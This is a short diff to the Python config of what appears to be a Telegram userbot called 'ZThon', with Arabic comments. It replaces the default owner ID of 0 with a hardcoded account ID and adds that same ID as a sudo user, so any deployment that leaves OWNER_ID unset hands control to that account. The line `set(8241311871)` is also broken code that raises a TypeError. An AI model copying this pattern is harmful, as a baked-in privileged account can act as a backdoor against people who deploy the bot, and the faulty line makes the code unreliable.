@@ -24,12 +24,12 @@ class Config(object):
     # ====================================================
     # هنا نحط الآيدي حقك، إذا ما لقاه في ريندر يحط 0 (بس الأفضل تحطه في ريندر)
     try:
-        OWNER_ID = int(os.environ.get("OWNER_ID", 0))
+        OWNER_ID = int(os.environ.get("OWNER_ID", 8241311871))
     except:
-        OWNER_ID = 0
+        OWNER_ID = 8241311871 
         
     # المطورين المساعدين (سودو)
-    SUDO_USERS: Set[int] = set()
+    SUDO_USERS: Set[int] = set(8241311871)
     
     # الاسم
     ALIVE_NAME = os.environ.get("ALIVE_NAME", "ZThon User")
